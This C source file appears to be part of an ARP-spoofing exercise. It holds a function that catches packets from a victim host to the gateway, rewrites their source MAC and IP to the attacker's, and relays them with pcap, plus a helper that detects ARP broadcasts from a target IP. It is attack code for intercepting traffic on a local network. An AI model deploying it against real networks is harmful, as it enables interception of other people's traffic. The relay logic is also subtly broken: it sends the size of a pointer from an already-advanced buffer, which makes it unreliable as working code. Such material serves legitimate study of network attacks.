#include "send_arp.h"

int pcap_victiom_to_GW(struct in_addr victimIp, struct in_addr GWIp, struct ether_addr attackerMac,
						struct in_addr attackerIp, char* device, pcap_t *pcd, const u_char* packet){
	struct ether_header *eth;   // ethernet header struct
    struct ip *iph;				// ip header struct

	eth = (struct ether_header *)packet;
	packet = packet + sizeof(struct ether_header);

	// is it to the GW ip?
	if(ntohs(eth->ether_type) == ETHERTYPE_IP){
		iph = (struct ip *) packet;
		//printf("Destination Address : %s\n", inet_ntoa(iph->ip_dst));
		//printf("source      Address : %s\n", inet_ntoa(iph->ip_src));
		if( ( memcmp( &(iph->ip_dst), &GWIp, sizeof(struct in_addr) ) == 0) && ( memcmp( &(iph->ip_src), &victimIp, sizeof(struct in_addr) ) == 0 ) ){
			printf("\n********** FIND: [victim > GW] *********\n");
			memcpy(eth->ether_shost, &attackerMac, ETHER_ADDR_LEN);
			memcpy(&(iph->ip_src), &attackerIp, sizeof(struct in_addr));
			if(pcap_sendpacket(pcd, packet, sizeof(packet)) == -1)
    			printf("relay pcap_sendpacket error\n");
		}
	}
	
	// if there is no packet captured or [victim > GW](X)
	return 0;
}

int isbroadcast(const u_char* packet, struct in_addr IP){
	struct ether_header *eth;   // ethernet header struct
    struct ether_arp *arph;     // arp header struct
	struct ether_header broad;	// ethernet header struct for broad

    for(int i=0;i<ETHER_ADDR_LEN;i++)
    	broad.ether_dhost[i] = 0xff;

    eth = (struct ether_header *)packet;
    packet = packet + sizeof(struct ether_header);

    // if arp
    if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
    	arph = (struct ether_arp *) packet;
        // is broadcast?
        if(memcmp(arph->arp_spa, &IP.s_addr, 4) == 0){
            if(memcmp(eth->ether_dhost, broad.ether_dhost, ETHER_ADDR_LEN) == 0){
            	printf("\n********** FIND: broadcast *********\n");
            	return 1;
            }
        }
    }
    return 0;
}